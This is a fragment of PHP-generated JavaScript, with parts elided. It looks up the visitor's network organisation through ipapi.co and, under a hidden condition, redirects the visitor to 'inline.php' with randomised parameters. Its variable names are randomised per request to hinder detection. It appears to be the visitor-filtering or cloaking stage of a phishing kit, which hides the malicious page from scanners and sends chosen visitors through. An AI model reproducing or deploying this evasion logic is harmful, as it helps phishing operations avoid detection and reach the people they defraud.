...
<script>
var <?php echo $rollon; ?> = new XMLHttpRequest();
<?php echo $rollon; ?>.open('GET', 'https://ipapi.co/org/', true);
<?php echo $rollon; ?>.responseType = 'text';
<?php echo $rollon; ?>.onload = function () {
if (<?php echo $rollon; ?>.readyState === <?php echo $rollon; ?>.DONE) {
if (<?php echo $rollon; ?>.status === 200) {
var e<?php echo $rand; ?> = <?php echo $rollon; ?>.response;
if (
...
window.location.href = "inline.php?<?php echo $spo;?>=<?php echo $spo;?>-<?php echo $rand;?>";
}
        }
    }
};

<?php echo $rollon; ?>.send(null);
